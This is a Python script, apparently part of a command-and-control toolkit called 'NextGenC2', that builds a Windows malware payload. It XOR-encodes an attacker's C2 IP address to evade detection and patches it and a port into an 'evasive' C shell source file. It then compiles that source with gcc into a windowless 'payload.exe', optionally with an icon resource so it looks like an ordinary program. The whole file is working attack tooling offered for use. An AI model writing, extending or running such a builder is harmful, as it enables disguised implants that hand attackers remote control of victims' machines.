import sys
import os
import subprocess

def xor_encrypt(data, key=0xAA):
    encrypted = []
    for char in data:
        encrypted.append(ord(char) ^ key)
    return encrypted

def generate_payload(ip, port, source_file="shell_evasive.c", output_file="shell_generated.c"):
    try:
        with open(source_file, "r", encoding="utf-8") as f:
            content = f.read()
    except FileNotFoundError:
        print(f"Error: Source file '{source_file}' not found.")
        return

    # 1. Encrypt IP
    encrypted_ip = xor_encrypt(ip)
    hex_ip = ", ".join([f"0x{b:02x}" for b in encrypted_ip]) + ", 0"
    
    # 2. Replace IP Block
    # We look for the specific pattern of the ip_enc definition
    # Since the original file has a specific hardcoded block, we can try to find it using regex or string search
    # But a safer way is to replace the whole block if we can identify it uniquely.
    
    # Let's try to find the line defining ip_enc
    lines = content.splitlines()
    new_lines = []
    skip = False
    
    ip_replaced = False
    port_replaced = False
    
    for i, line in enumerate(lines):
        if "char ip_enc[] =" in line and not ip_replaced:
            # We found the start of the IP definition
            # We will replace this line and the next few lines if they are part of the block
            # Actually, we can just replace this single line with the new array
            # The original code:
            # char ip_enc[] = {0x9b, ...};
            new_lines.append(f'    // "{ip}"')
            new_lines.append(f'    char ip_enc[] = {{{hex_ip}}};')
            ip_replaced = True
            continue
        
        if ip_replaced and line.strip().startswith("//") and '"' in line:
             # Skip the old comment line if it exists right before or after
             continue

        if "addr.sin_port = myHtons(" in line and not port_replaced:
            # Replace port
            new_lines.append(f'        addr.sin_port = myHtons({port});')
            port_replaced = True
            continue
            
        new_lines.append(line)

    new_content = "\n".join(new_lines)

    with open(output_file, "w", encoding="utf-8") as f:
        f.write(new_content)
    
    print(f"[+] Generated source code: {output_file}")
    
    # Compile
    print("[*] Compiling...")
    # Check if resource.o exists
    cmd = ["gcc", output_file, "-o", "payload.exe", "-mwindows", "-lws2_32"]
    if os.path.exists("resource.o"):
        cmd.insert(2, "resource.o")
        print("    (Included resource.o for icon)")
    
    try:
        subprocess.check_call(cmd)
        print(f"[+] Compilation successful! Output: payload.exe")
    except subprocess.CalledProcessError:
        print("[-] Compilation failed.")

if __name__ == "__main__":
    print("=== NextGenC2 Payload Generator ===")
    if len(sys.argv) == 3:
        ip = sys.argv[1]
        port = sys.argv[2]
    else:
        ip = input("Enter C2 IP Address: ").strip()
        port = input("Enter C2 Port: ").strip()
    
    generate_payload(ip, port)
